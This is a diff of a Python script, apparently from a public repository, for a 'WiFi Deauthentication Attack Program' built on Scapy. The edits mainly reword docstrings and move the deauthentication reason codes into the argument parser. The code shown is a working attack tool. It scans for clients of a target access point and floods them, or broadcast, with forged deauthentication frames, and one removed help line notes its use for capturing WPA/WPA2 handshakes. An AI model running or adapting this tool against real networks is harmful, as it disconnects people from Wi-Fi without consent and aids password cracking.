@@ -27,41 +27,31 @@
 #--------------------------------------------------------------------------------------------------------------------------
 
 # --- Import Section: Modules required for the program ---
-import sys          # For system operations like exiting and platform checking
-import time         # For timing and delay operations
-import re           # For validating MAC address format with regex
-import os           # For interacting with the operating system
-import signal       # For handling signals like CTRL+C
-import argparse     # For parsing command-line arguments
-import platform     # For detailed operating system checking
-from scapy.all import *  # For network packet manipulation and sending
-from termcolor import colored  # For colored terminal output
+import sys          # System operations like exiting and platform checking
+import time         # Timing and delay operations
+import re           # Regular expressions for validating MAC address format
+import os           # Operating system interactions
+import signal       # Signal handling (e.g., CTRL+C)
+import argparse     # Command-line argument parsing
+import platform     # Detailed operating system information
+from scapy.all import *  # Network packet manipulation and sending
+from termcolor import colored  # Colored terminal output
 
-# --- Global Variable Section ---
+# --- Global Variables ---
 stop_attack = False  # Flag to stop the attack when CTRL+C is pressed
 
-# --- List of Common Reason Codes for Deauthentication Attacks ---
-COMMON_REASON_CODES = {
-    1: "Unspecified reason - Generic and inconspicuous reason for disconnection",
-    3: "Deauthenticated because sending STA is leaving IBSS or ESS - Mimics STA exiting network",
-    4: "Disassociated due to inactivity - Disconnects as if client is idle",
-    7: "Class 3 frame received from nonassociated STA - Rejects data from unassociated STA (default)",
-    8: "Disassociated because sending STA is leaving BSS - Mimics STA leaving BSS",
-    15: "4-Way Handshake timeout - Forces re-authentication, useful for capturing WPA/WPA2 handshakes"
-}
-
-# --- Function Section ---
+# --- Function Definitions ---
 
 def signal_handler(sig, frame):
     """
-    Handle the CTRL+C signal to stop the deauthentication attack gracefully.
+    Handle the CTRL+C signal to gracefully stop the deauthentication attack.
 
     Args:
         sig (int): Signal number (e.g., SIGINT for CTRL+C).
         frame (frame): Current stack frame.
 
-    Notes:
-        - Sets the global `stop_attack` flag to True and exits the program cleanly.
+    Returns:
+        None: Exits the program with status code 0 after stopping the attack.
     """
     global stop_attack
     time_str = colored(get_current_time(), 'cyan')
@@ -74,7 +64,7 @@ def get_current_time():
     Retrieve the current time formatted as HH:MM:SS.
 
     Returns:
-        str: The current time in "HH:MM:SS" format.
+        str: Current time in "HH:MM:SS" format.
     """
     return time.strftime("%H:%M:%S")
 
@@ -83,10 +73,10 @@ def validate_mac(mac):
     Validate the format of a MAC address.
 
     Args:
-        mac (str): The MAC address to validate (e.g., "00:11:22:33:44:55" or "00-11-22-33-44-55").
+        mac (str): MAC address to validate (e.g., "00:11:22:33:44:55").
 
     Returns:
-        str: The validated MAC address if correct.
+        str: The validated MAC address if valid.
 
     Raises:
         ValueError: If the MAC address format is invalid.
@@ -99,8 +89,8 @@ def check_root():
     """
     Ensure the program is running with root privileges.
 
-    Notes:
-        - Exits the program with an error message if not run as root.
+    Returns:
+        None: Exits with status code 1 if not running as root.
     """
     if os.geteuid() != 0:
         time_str = colored(get_current_time(), 'cyan')
@@ -112,10 +102,10 @@ def check_interface_exists(interface):
     Verify that the specified network interface exists on the system.
 
     Args:
-        interface (str): The network interface to check (e.g., "wlan0").
+        interface (str): Network interface name (e.g., "wlan0").
 
-    Notes:
-        - Exits the program with an error message if the interface is not found.
+    Returns:
+        None: Exits with status code 1 if the interface does not exist.
     """
     interfaces = os.listdir("/sys/class/net/")
     if interface not in interfaces:
@@ -128,10 +118,10 @@ def check_interface_mode(interface):
     Check if the specified network interface is in monitor mode.
 
     Args:
-        interface (str): The network interface to check (e.g., "wlan0").
+        interface (str): Network interface name (e.g., "wlan0").
 
-    Notes:
-        - Exits the program with an error message if the interface is not in monitor mode or if an error occurs during the check.
+    Returns:
+        None: Exits with status code 1 if not in monitor mode or if an error occurs.
     """
     try:
         result = os.popen(f"iwconfig {interface}").read()
@@ -144,17 +134,17 @@ def check_interface_mode(interface):
         print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error checking interface mode: {e}", 'white'))
         sys.exit(1)
 
-def create_deauth_packet(bssid, client, reason=7):
+def create_deauth_packet(bssid, client, reason=1):
     """
-    Create a deauthentication packet using Scapy.
+    Create a deauthentication packet using Scapy with a specified reason code.
 
     Args:
-        bssid (str): The BSSID (MAC address) of the target access point (e.g., "00:11:22:33:44:55").
-        client (str): The MAC address of the client to deauthenticate (e.g., "66:77:88:99:AA:BB").
-        reason (int): The reason code for deauthentication (default: 7). Must be one of: 1, 3, 4, 7, 8, 15.
+        bssid (str): MAC address of the target Access Point (AP).
+        client (str): MAC address of the target client or "ff:ff:ff:ff:ff:ff" for broadcast.
+        reason (int, optional): Deauthentication reason code (default is 1).
 
     Returns:
-        scapy.packet.Packet: The constructed deauthentication packet.
+        scapy.packet.Packet: A crafted deauthentication packet.
     """
     pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=reason)
     return pkt
@@ -164,17 +154,14 @@ def scan_clients(interface, bssid, channel, timeout=30, verbose=False):
     Scan for clients connected to the specified access point.
 
     Args:
-        interface (str): Network interface in monitor mode (e.g., "wlan0").
-        bssid (str): BSSID of the target access point (e.g., "00:11:22:33:44:55").
-        channel (int): Channel to scan on (e.g., 6).
-        timeout (int): Scan duration in seconds (default: 30).
-        verbose (bool): If True, print each discovered client (default: False).
+        interface (str): Network interface in monitor mode.
+        bssid (str): MAC address of the target AP.
+        channel (int): Channel of the target AP.
+        timeout (int, optional): Duration of the scan in seconds (default is 30).
+        verbose (bool, optional): Enable detailed output (default is False).
 
     Returns:
-        list: List of unique client MAC addresses discovered during the scan.
-
-    Notes:
-        - Exits the program if setting the channel fails.
+        list: List of client MAC addresses found.
     """
     clients = set()
     try:
@@ -185,7 +172,7 @@ def scan_clients(interface, bssid, channel, timeout=30, verbose=False):
         sys.exit(1)
     
     def packet_handler(pkt):
-        """Handle packets during sniffing to extract client MACs."""
+        """Callback function to process sniffed packets and extract client MACs."""
         if pkt.haslayer(Dot11) and pkt.addr2 == bssid and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
             client_mac = pkt.addr1
             if client_mac not in clients:
@@ -199,24 +186,23 @@ def scan_clients(interface, bssid, channel, timeout=30, verbose=False):
     sniff(iface=interface, prn=packet_handler, timeout=timeout)
     return list(clients)
 
-def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, is_manual_client=False, verbose=False, reason=7):
+def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, reason=1, is_manual_client=False, verbose=False):
     """
-    Send deauthentication packets to specified clients or broadcast.
+    Send deauthentication packets to specified clients or broadcast with a specified reason code.
 
     Args:
-        interface (str): Network interface in monitor mode (e.g., "wlan0").
-        bssid (str): BSSID of the target access point (e.g., "00:11:22:33:44:55").
+        interface (str): Network interface in monitor mode.
+        bssid (str): MAC address of the target AP.
         clients (list): List of client MAC addresses to target.
-        count (int): Number of packets to send per client (0 for continuous, default: 0).
-        channel (int): Channel to operate on (e.g., 6).
-        interval (float): Delay between packet sends in seconds (default: 0).
-        is_manual_client (bool): True if targeting a manually specified client (default: False).
-        verbose (bool): If True, print detailed packet sending info (default: False).
-        reason (int): Reason code for deauthentication (default: 7). Must be one of: 1, 3, 4, 7, 8, 15.
+        count (int): Number of packets to send per client (0 for continuous).
+        channel (int): Channel of the target AP.
+        interval (float, optional): Delay between packets in seconds (default is 0).
+        reason (int, optional): Deauthentication reason code (default is 1).
+        is_manual_client (bool, optional): True if client was manually specified (default is False).
+        verbose (bool, optional): Enable detailed output (default is False).
 
-    Notes:
-        - Switches to broadcast mode ("ff:ff:ff:ff:ff:ff") if no clients are found.
-        - Exits with an error if permissions are insufficient or an exception occurs.
+    Returns:
+        None: Exits with status code 1 on error.
     """
     try:
         if not clients:
@@ -237,7 +223,7 @@ def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, i
 
         if count == 0:
             time_str = colored(get_current_time(), 'cyan')
-            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack with continuous packets (reason code: {reason}, interval: {interval}s)...", 'white'))
+            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting continuous deauthentication attack (interval: {interval}s, reason code: {reason})...", 'white'))
             packet_number = 1
             while not stop_attack:
                 for client_mac in clients:
@@ -257,7 +243,7 @@ def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, i
         else:
             total_packets = count * len(clients)
             time_str = colored(get_current_time(), 'cyan')
-            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack with {count} packets per client (total: {total_packets}, reason code: {reason}, interval: {interval}s)...", 'white'))
+            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack with {count} packets per client (total: {total_packets}, interval: {interval}s, reason code: {reason})...", 'white'))
             packet_number = 1
             for client_mac in clients:
                 if stop_attack:
@@ -295,20 +281,26 @@ def main():
     """
     Main function to coordinate the execution of the deauthentication attack program.
 
-    Notes:
-        - Checks OS compatibility (Linux only), root privileges, and interface status.
-        - Parses command-line arguments and initiates the attack.
-        - Handles exceptions and provides appropriate error messages.
+    This function performs initial checks, parses command-line arguments, and orchestrates
+    the scanning and sending of deauthentication packets.
+
+    Returns:
+        None: Exits with status code 1 on error.
     """
+    # Check if the operating system is Linux
     os_name = platform.system()
     if os_name != "Linux":
         time_str = colored(get_current_time(), 'cyan')
         print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"This program is only supported on Linux! Detected OS: {os_name}", 'white'))
         sys.exit(1)
 
+    # Set up signal handler for CTRL+C
     signal.signal(signal.SIGINT, signal_handler)
+    
+    # Ensure root privileges
     check_root()
 
+    # Program description for help menu
     description = (
         "WiFi Deauthentication Attack Program\n"
         "Author: Rofi (Fixploit03)\n"
@@ -316,11 +308,7 @@ def main():
         "Copyright (c) 2025 Rofi (Fixploit03). All rights reserved."
     )
 
-    # Format common reason codes for help menu
-    reason_help = "Reason code for deauthentication (default: 7). Available reason codes:\n"
-    for code, desc in COMMON_REASON_CODES.items():
-        reason_help += f"  {code}: {desc}\n"
-
+    # Set up argument parser
     parser = argparse.ArgumentParser(
         description=description,
         formatter_class=argparse.RawTextHelpFormatter
@@ -333,26 +321,43 @@ def main():
     parser.add_argument("-n", "--count", type=int, default=0, help="Number of packets to send per client (default: 0, continuous)")
     parser.add_argument("-t", "--timeout", type=int, default=30, help="Client scan timeout in seconds (default: 30)")
     parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packet sends in seconds (default: 0)")
+    parser.add_argument(
+        "-r", "--reason", 
+        type=int, 
+        choices=[1, 2, 3, 4, 5, 7, 8, 9, 14, 15], 
+        default=1, 
+        help=(
+            "Deauthentication reason code (default: 1). Available options:\n"
+            "  1: Unspecified reason - Generic reason, no specific cause.\n"
+            "  2: Previous authentication no longer valid - Prior auth expired or invalid.\n"
+            "  3: Deauthenticated because sending STA is leaving - Station is disconnecting.\n"
+            "  4: Disassociated due to inactivity - No activity from the station.\n"
+            "  5: Disassociated because AP is unable to handle all associated STAs - AP overloaded.\n"
+            "  7: Class 3 frame received from nonassociated station - Unauthorized frame.\n"
+            "  8: Disassociated because sending STA is leaving BSS - Station leaving network.\n"
+            "  9: STA requesting association is not authenticated - Authentication required.\n"
+            " 14: MIC failure (Message Integrity Check) - Security protocol violation.\n"
+            " 15: 4-way handshake timeout - Failed to complete security handshake."
+        )
+    )
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
-    parser.add_argument("-r", "--reason", type=int, default=7, help=reason_help)
 
+    # Parse command-line arguments
     args = parser.parse_args()
 
+    # Validate network interface
     check_interface_exists(args.interface)
     check_interface_mode(args.interface)
 
     try:
-        # Validate reason code against the common list
-        if args.reason not in COMMON_REASON_CODES:
-            valid_codes = ", ".join(map(str, COMMON_REASON_CODES.keys()))
-            raise ValueError(f"Invalid reason code: {args.reason}. Must be one of: {valid_codes}")
-
+        # If no client is specified, scan for connected clients
         if args.client is None:
             clients = scan_clients(args.interface, args.bssid, args.channel, args.timeout, verbose=args.verbose)
-            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, is_manual_client=False, verbose=args.verbose, reason=args.reason)
+            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, args.reason, is_manual_client=False, verbose=args.verbose)
+        # If a client is specified, use it directly
         else:
             clients = [validate_mac(args.client)]
-            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, is_manual_client=True, verbose=args.verbose, reason=args.reason)
+            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, args.reason, is_manual_client=True, verbose=args.verbose)
 
     except ValueError as ve:
         time_str = colored(get_current_time(), 'cyan')
